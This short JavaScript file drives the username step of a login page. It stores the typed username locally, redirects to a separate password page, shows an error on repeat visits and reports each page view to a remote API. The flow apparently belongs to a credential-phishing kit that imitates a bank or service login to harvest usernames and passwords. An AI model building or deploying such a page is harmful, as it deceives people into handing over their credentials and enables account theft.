console.log("Index");

if(info.user !== ''){
    document.querySelector('.error').classList.remove('d-none');
}

// Enviar info
fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body:JSON.stringify({
        message: 'PRINCIPAL/USER'
    })
});

document.querySelector('#form').addEventListener('submit', (e) =>{
    e.preventDefault();

    info.user = document.querySelector('#user').value;
    LS.setItem('info', JSON.stringify(info));

    window.location.href = 'password.html';
})


